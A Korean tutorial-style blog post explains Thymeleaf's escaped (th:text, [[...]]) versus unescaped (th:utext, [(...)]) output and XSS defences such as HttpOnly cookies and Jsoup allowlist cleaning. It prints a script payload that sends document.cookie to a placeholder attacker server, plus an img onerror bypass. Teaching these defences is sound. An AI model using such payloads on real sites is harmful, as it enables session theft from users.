## 텍스트 - text, utext



타임리프는 기본적으로 HTML 태그의 속성에 기능을 정의해서 동작한다. 

HTML의 콘텐츠(content)에 데이터를 출력할 때는 다음과 같이 `th:text` 를 사용하면 된다.

```html
<span th:text="${data}">
```

<br/>

HTML 콘텐츠 영역 안에서 직접 데이터를 출력하고 싶다면 다음과 같이 `[[...]]` 를 사용하면 된다.

```html
컨텐츠 안에서 직접 출력하기 = [[${data}]]
```

<br/><br/>

## 예제 1)

### 컨트롤러

```java
@Controller
@RequestMapping("/basic")
public class BasicController {

    @GetMapping("/text-basic")
    public String textBasic(Model model) {
        model.addAttribute("data", "Hello Spring!");
        return "/basic/text-basic";
    }
}
```

<br/><br/>

### resources → templates → basic → text-basic.html 생성

```html
<!DOCTYPE html>
<html xmlns:th="http://www.thymeleaf.org">
<head>
    <meta charset="UTF-8">
    <title>Title</title>
</head>
<body>
<h1>컨텐츠에 데이터 출력하기</h1>
<ul>
    <li>th:text 사용 <span th:text="${data}"></span></li>
    <li>컨텐츠 안에서 직접 출력하기 = [[${data}]]</li>
</ul>
</body>
</html>
```

<br/><br/>

## 실행시켜보면 

![이미지](/programming/img/겨.PNG)

<br/><br/>

## 한가지 문제가 있다.

Spring! **을 강조 하고 싶어서 <b> 태그를 사용 했다.** 

그런데, 실행 시켜보니.

<br/>

```
Hello < b >Spring!</ b >
```


이렇게 출력 되는 것이다.

이런 상황에 주의 해야 될것은?

<br/>

## 타임리프의 다음 두 기능을 사용하면 된다.

```html
th:text -> th:utext 로 변경하면 된다.
[[...]] -> [(...)] 로 변경하면 된다.
```

실행 시켜보면 -> 실행해보면 다음과 같이 정상 수행되는 것을 확인할 수 있다.


웹 브라우저: Hello **Spring! → 이렇게 잘 출력 되는 걸 알 수 있다.**


<br/>

>**Reference** <br/>스프링 MVC 2편 - 백엔드 웹 개발 활용 기술 - https://www.inflearn.com/course/%EC%8A%A4%ED%94%84%EB%A7%81-mvc-2

<br/>

## 궁금증!

```java
utext 를 쓰면 정확히 무엇이 위험해지나
```

`text` 는 HTML 특수문자를 바꿔서 넣는다.

```java
<b>굵게</b>
```

```java
th:text   ->  &lt;b&gt;굵게&lt;/b&gt;      화면에는 <b>굵게</b> 라는 글자가 보인다
th:utext  ->  <b>굵게</b>                 화면에는 굵은 글씨가 보인다
```

<br/>

바꾸는 문자는 다섯 개다.

```java
<   ->  &lt;
>   ->  &gt;
&   ->  &amp;
"   ->  &quot;
'   ->  &#39;
```

<br/>

## 이게 왜 보안 장치인가

사용자가 이런 걸 입력할 수 있기 때문이다.

```java
<script>fetch('http://공격자서버/?c=' + document.cookie)</script>
```

<br/>

`utext` 로 출력하면 이게 실제 스크립트로 실행된다.

<br/>

보는 사람의 쿠키가 공격자에게 넘어간다.

앞의 쿠키(Cookie) 글에서 본 세션 쿠키가 털리면 그 계정으로 로그인되는 것이다.

<br/>

이게 XSS다.

<br/>

## HttpOnly 가 이걸 막아준다

```java
Set-Cookie: JSESSIONID=abc; HttpOnly
```

<br/>

`HttpOnly` 가 붙으면 자바스크립트가 `document.cookie` 로 못 읽는다.

<br/>

앞의 HTML, HTTP API, CSR, SSR 글에서 본 대로,

토큰을 `localStorage` 에 두는 것보다 `HttpOnly` 쿠키가 안전한 이유가 이것이다.

<br/>

다만 XSS가 뚫리면 쿠키를 못 읽어도 요청은 보낼 수 있다.

브라우저가 쿠키를 자동으로 붙여주기 때문이다.

<br/>

그래서 `HttpOnly` 는 피해를 줄이는 것이지 막는 게 아니다.

애초에 `utext` 를 안 쓰는 게 먼저다.

<br/>

## 그럼 utext 는 언제 쓰나

내가 만든 HTML만 넣을 때다.

```java
model.addAttribute("message", "가입을 <b>축하</b>합니다");
```

<br/>

앞의 스프링 메시지, 국제화 글에서 본 메시지 파일의 내용처럼

개발자가 관리하는 문자열이면 괜찮다.

<br/>

사용자 입력이 섞이면 안 된다.

```java
model.addAttribute("message", "<b>" + userInput + "</b>님 환영합니다");   // 위험
```

<br/>

앞부분은 내가 쓴 것이라도 `userInput` 이 섞이면 뚫린다.

<br/>

## 게시판 본문 같은 것은 어떻게 하나

에디터로 쓴 글은 HTML을 살려야 하는데 스크립트는 막아야 한다.

<br/>

이럴 때는 저장하거나 출력하기 전에 걸러낸다.

```java
Jsoup.clean(html, Safelist.basic())
```

<br/>

허용할 태그 목록을 정해두고 나머지를 지우는 방식이다.

<br/>

```java
<b>, <i>, <p>, <a>     -> 허용
<script>, <iframe>     -> 제거
onclick 같은 이벤트 속성 -> 제거
```

<br/>

`막을 것을 나열하는` 방식이 아니라 `허용할 것을 나열하는` 방식이라는 게 중요하다.

<br/>

막을 것을 나열하면 빠뜨린 것이 생긴다.

```java
<img src=x onerror="공격코드">
```

<br/>

`script` 만 막았는데 `img` 의 `onerror` 로 뚫리는 식이다.

<br/>

## text 와 그냥 쓰는 것의 차이

```html
<span th:text="${name}">기본값</span>
<span>[[${name}]]</span>
```

<br/>

두 번째를 `인라인 표현식` 이라고 한다.

태그로 감쌀 필요가 없을 때 쓴다.

<br/>

```html
안녕하세요 [[${name}]]님, 오늘은 [[${date}]]입니다.
```

<br/>

`th:text` 로는 이걸 못 쓴다. 태그의 내용을 통째로 바꿔버리기 때문이다.

<br/>

`[[...]]` 는 이스케이프하고, `[(...)]` 는 안 한다.

```java
[[${html}]]   ->  th:text 와 같다
[(${html})]   ->  th:utext 와 같다
```

<br/>

괄호 모양이 다른 것뿐인데 보안 성격이 완전히 다르니

코드 리뷰할 때 `[(` 가 보이면 한 번 더 봐야 한다.
